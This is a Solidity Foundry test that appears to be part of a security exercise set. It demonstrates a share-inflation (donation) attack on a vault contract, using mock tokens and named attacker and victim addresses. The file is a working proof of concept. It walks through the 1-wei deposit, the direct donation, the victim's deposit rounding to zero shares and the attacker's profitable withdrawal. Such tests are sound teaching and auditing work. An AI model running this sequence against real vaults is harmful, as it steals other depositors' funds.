// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";
import {Vault, IERC20} from "../../src/02_share_inflation/Vault.sol";
import {MockERC20} from "./mocks/Mocks.sol";

/// @notice First depositor mints 1 wei, then donates assets straight to the vault
///         to inflate the share price. The next depositor's shares round down to
///         zero (or near zero) and the attacker redeems them.
contract ShareInflationTest is Test {
    MockERC20 asset;
    Vault vault;

    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");

    function setUp() public {
        asset = new MockERC20("USD", "USD", 18);
        vault = new Vault(IERC20(address(asset)));
    }

    function test_donation_inflates_the_next_depositor_out_of_their_shares() public {
        asset.mint(attacker, 1 + 10_000e18);
        asset.mint(victim, 5_000e18);

        vm.startPrank(attacker);
        asset.approve(address(vault), type(uint256).max);
        vault.deposit(1);
        // Donate: balance rises, totalAssets does not until someone deposits.
        asset.transfer(address(vault), 10_000e18);
        vm.stopPrank();

        vm.startPrank(victim);
        asset.approve(address(vault), type(uint256).max);
        uint256 victimShares = vault.deposit(5_000e18);
        vm.stopPrank();

        emit log_named_uint("victim shares", victimShares);

        // The victim pays 5,000 and receives nothing: 5,000 * 1 share / 10,001 assets rounds to 0.
        assertEq(victimShares, 0, "victim shares round to zero");

        uint256 attackerShares = vault.shares(attacker);
        vm.prank(attacker);
        uint256 out = vault.withdraw(attackerShares);
        uint256 profit = out - 1;
        emit log_named_uint("attacker out", out);
        assertGt(profit, 9_000e18, "attacker captured the donation");
    }
}
